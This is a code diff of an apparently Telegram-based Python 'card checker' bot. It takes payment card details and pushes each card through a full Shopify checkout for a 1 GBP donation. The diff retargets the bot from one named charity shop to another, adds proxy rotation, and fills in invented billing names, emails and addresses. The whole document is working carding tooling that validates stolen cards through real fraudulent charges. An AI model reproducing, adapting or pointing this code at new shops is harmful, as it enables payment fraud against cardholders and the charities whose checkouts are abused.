@@ -10,6 +10,7 @@ import uuid
 import time
 import asyncio
 import random
+from proxy import reqproxy
 
 def find_between(s, first, last):
     try:
@@ -29,11 +30,11 @@ def parse_card(card_input: str):
         return cc, mm, yy, cvc
     except ValueError:
         return None, None, None, None
-        
+
 random_amount1 = random.randint(1, 9)
-random_amount2 = random.randint(1, 99)             
+random_amount2 = random.randint(1, 99)                        
 emails = [
-    f"genpaypal{random_amount1}{random_amount2}@gmail.com",
+    f"rodamuser{random_amount1}{random_amount2}@gmail.com",
     # add more
 ]
 #နာမည်များကိုလဲထပ်ထည့်နိုင်ပါသည်
@@ -76,7 +77,7 @@ async def sh(message):
     rfirst = random.choice(first_names)
     rlast = random.choice(last_names)
 
-
+    r = await reqproxy()  
     async with aiohttp.ClientSession() as r:
         # BIN Lookup
         try:
@@ -94,14 +95,14 @@ async def sh(message):
             return "BIN Lookup failed"
 
         # Step 1: Login
-        url = "https://givinggertie.com/cart/add.js"
+        url = "https://shop.alderheycharity.org/cart/add.js"
         headers = {
-            'authority': 'givinggertie.com',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'authority': 'shop.alderheycharity.org',
+            'accept': '*/*',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://givinggertie.com',
-            'referer': 'https://givinggertie.com/products/make-a-donation',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://shop.alderheycharity.org',
+            'referer': 'https://shop.alderheycharity.org/products/donate?variant=29421038764120',
             'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -115,12 +116,11 @@ async def sh(message):
         data = {
             'form_type': 'product',
             'utf8': '✓',
-            'id': '32606049337390',
+            'id': '29421038764120',
             'quantity': '1',
-            'product-id': '4637130653742',
+            'product-id': '3930337509464',
             'section-id': 'product-template',
         }
-        
         async with r.post(url, headers=headers, data=data) as response:
             text = await response.text()
             print(text)
@@ -129,10 +129,10 @@ async def sh(message):
                 return "failded"
             
         headers = {
-            'authority': 'givinggertie.com',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'authority': 'shop.alderheycharity.org',
+            'accept': '*/*',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'referer': 'https://givinggertie.com/products/make-a-donation',
+            'referer': 'https://shop.alderheycharity.org/products/donate?variant=29421038764120',
             'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -140,10 +140,9 @@ async def sh(message):
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': user_agent,
-            'x-requested-with': 'XMLHttpRequest',
         }
 
-        async with r.get('https://givinggertie.com/cart.js', headers=headers) as response:
+        async with r.get('https://shop.alderheycharity.org/cart.js', headers=headers) as response:
             raw = await response.text()
             try:
                 res_json = json.loads(raw)
@@ -153,13 +152,13 @@ async def sh(message):
             
         
         headers = {
-            'authority': 'givinggertie.com',
+            'authority': 'shop.alderheycharity.org',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://givinggertie.com',
-            'referer': 'https://givinggertie.com/cart',
+            'origin': 'https://shop.alderheycharity.org',
+            'referer': 'https://shop.alderheycharity.org/cart',
             'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -173,10 +172,11 @@ async def sh(message):
         
         data = {
             'updates[]': '1',
+            'donation-fixed-amount': '',
             'checkout': 'Check out',
-        }
+        }        
         response = await r.post(
-    'https://givinggertie.com/cart',
+    'https://shop.alderheycharity.org/cart',
     headers=headers,
     data=data,
     allow_redirects=True
@@ -205,7 +205,7 @@ async def sh(message):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': user_agent,
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
         }
         
         json_data = {
@@ -219,7 +219,7 @@ async def sh(message):
                 'issue_number': '',
                 'name': f'{rfirst} {rlast}',
             },
-            'payment_session_scope': 'givinggertie.com',
+            'payment_session_scope': 'shop.alderheycharity.org',
         }
         async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data) as response:
             try:
@@ -229,12 +229,12 @@ async def sh(message):
                 return "No token"
 
         headers = {
-            'authority': 'givinggertie.com',
+            'authority': 'shop.alderheycharity.org',
             'accept': 'application/json',
-            'accept-language': 'en',
+            'accept-language': 'en-GB',
             'content-type': 'application/json',
-            'origin': 'https://givinggertie.com',
-            'referer': 'https://givinggertie.com/',
+            'origin': 'https://shop.alderheycharity.org',
+            'referer': 'https://shop.alderheycharity.org/',
             'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -244,7 +244,6 @@ async def sh(message):
             'shopify-checkout-client': 'checkout-web/1.0',
             'user-agent': user_agent,
             'x-checkout-one-session-token': x,
-            'x-checkout-web-build-id': '876888c5d24185f3e1880ad194a39b1f706a819e',
             'x-checkout-web-deploy-stage': 'production',
             'x-checkout-web-server-handling': 'fast',
             'x-checkout-web-server-rendering': 'yes',
@@ -311,8 +310,8 @@ async def sh(message):
                                 'stableId': stableid,
                                 'merchandise': {
                                     'productVariantReference': {
-                                        'id': 'gid://shopify/ProductVariantMerchandise/32606049337390',
-                                        'variantId': 'gid://shopify/ProductVariant/32606049337390',
+                                        'id': 'gid://shopify/ProductVariantMerchandise/29421038764120',
+                                        'variantId': 'gid://shopify/ProductVariant/29421038764120',
                                         'properties': [],
                                         'sellingPlanId': None,
                                         'sellingPlanDigest': None,
@@ -325,8 +324,8 @@ async def sh(message):
                                 },
                                 'expectedTotalPrice': {
                                     'value': {
-                                        'amount': '121.00',
-                                        'currencyCode': 'THB',
+                                        'amount': '1.00',
+                                        'currencyCode': 'GBP',
                                     },
                                 },
                                 'lineComponentsSource': None,
@@ -349,15 +348,15 @@ async def sh(message):
                                         'sessionId': sid,
                                         'billingAddress': {
                                             'streetAddress': {
-                                                'address1': '1010 N Kings Hwy',
+                                                'address1': '27 Allen Street',
                                                 'address2': '',
-                                                'city': 'Myrtle Beach',
+                                                'city': 'New York',
                                                 'countryCode': 'US',
-                                                'postalCode': '29577',
+                                                'postalCode': '10002',
                                                 'firstName': 'Rodam',
                                                 'lastName': 'User',
-                                                'zoneCode': 'SC',
-                                                'phone': '',
+                                                'zoneCode': 'NY',
+                                                'phone': '4303000850',
                                             },
                                         },
                                         'cardSource': None,
@@ -379,38 +378,38 @@ async def sh(message):
                                 },
                                 'amount': {
                                     'value': {
-                                        'amount': '121',
-                                        'currencyCode': 'THB',
+                                        'amount': '1',
+                                        'currencyCode': 'GBP',
                                     },
                                 },
                             },
                         ],
                         'billingAddress': {
                             'streetAddress': {
-                                'address1': '1010 N Kings Hwy',
+                                'address1': '27 Allen Street',
                                 'address2': '',
-                                'city': 'Myrtle Beach',
+                                'city': 'New York',
                                 'countryCode': 'US',
-                                'postalCode': '29577',
+                                'postalCode': '10002',
                                 'firstName': 'Rodam',
                                 'lastName': 'User',
-                                'zoneCode': 'SC',
-                                'phone': '',
+                                'zoneCode': 'NY',
+                                'phone': '4303000850',
                             },
                         },
                     },
                     'buyerIdentity': {
                         'customer': {
-                            'presentmentCurrency': 'THB',
-                            'countryCode': 'TH',
+                            'presentmentCurrency': 'GBP',
+                            'countryCode': 'GB',
                         },
                         'email': remail,
                         'emailChanged': False,
-                        'phoneCountryCode': 'TH',
+                        'phoneCountryCode': 'GB',
                         'marketingConsent': [],
                         'shopPayOptInPhone': {
-                            'number': '',
-                            'countryCode': 'TH',
+                            'number': '4303000850',
+                            'countryCode': 'GB',
                         },
                         'rememberMe': False,
                     },
@@ -422,7 +421,7 @@ async def sh(message):
                         'proposedTotalAmount': {
                             'value': {
                                 'amount': '0',
-                                'currencyCode': 'THB',
+                                'currencyCode': 'GBP',
                             },
                         },
                         'proposedTotalIncludedAmount': None,
@@ -452,14 +451,14 @@ async def sh(message):
                 'attemptToken': f'{tok}',
                 'metafields': [],
                 'analytics': {
-                    'requestUrl': f'https://givinggertie.com/checkouts/cn/{tok}/',
-                    'pageId': '07cdcd01-4768-4141-8A86-80B557A2C158',
+                    'requestUrl': f'https://shop.alderheycharity.org/checkouts/cn/{tok}',
+                    'pageId': '21179ff3-506D-458D-486A-9D45F5B7E083',
                 },
             },
             'operationName': 'SubmitForCompletion',
         }
 
-        async with r.post('https://givinggertie.com/checkouts/unstable/graphql',
+        async with r.post('https://shop.alderheycharity.org/checkouts/unstable/graphql',
     params=params,
     headers=headers,
     json=json_data,
@@ -474,12 +473,12 @@ async def sh(message):
             
                                
         headers = {
-            'authority': 'givinggertie.com',
+            'authority': 'shop.alderheycharity.org',
             'accept': 'application/json',
-            'accept-language': 'en',
+            'accept-language': 'en-GB',
             'content-type': 'application/json',
-            'origin': 'https://givinggertie.com',
-            'referer': 'https://givinggertie.com/',
+            'origin': 'https://shop.alderheycharity.org',
+            'referer': 'https://shop.alderheycharity.org/',
             'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -489,7 +488,7 @@ async def sh(message):
             'shopify-checkout-client': 'checkout-web/1.0',
             'user-agent': user_agent,
             'x-checkout-one-session-token': x,
-            'x-checkout-web-build-id': '876888c5d24185f3e1880ad194a39b1f706a819e',
+            'x-checkout-web-build-id': '2a98549848c1c7f8f36546fd9d5012f6e83ef9a5',
             'x-checkout-web-deploy-stage': 'production',
             'x-checkout-web-server-handling': 'fast',
             'x-checkout-web-server-rendering': 'yes',
@@ -510,13 +509,13 @@ async def sh(message):
         }
         elapsed_time = time.time() - start_time
         async with r.post(
-    'https://givinggertie.com/checkouts/unstable/graphql',
+    'https://shop.alderheycharity.org/checkouts/unstable/graphql',
     params=params,
     headers=headers,
     json=json_data,
 ) as response:
             text = await response.text()
-            if "redirectUrl" in text or "thank" in text.lower():
+            if "redirectUrl" in text.lower():
                 #print("Payment went through. No retry needed.")
                 
 
@@ -553,7 +552,7 @@ Bot by: TrickLab
             max_retries = 10
             for _ in range(max_retries):
                 async with r.post(
-            'https://givinggertie.com/checkouts/unstable/graphql',
+            'https://shop.alderheycharity.org/checkouts/unstable/graphql',
             params=params,
             headers=headers,
             json=json_data,
@@ -563,7 +562,7 @@ Bot by: TrickLab
                     final_text = await final_response.text()
                     fff = find_between(final_text, '"code":"', '"')
                     
-                    if "redirectUrl" in final_text or "thank" in final_text.lower():
+                    if "redirectUrl" in final_text.lower():
                         print("Payment successful on retry.")
 
                         return f"""Card: {full_card}
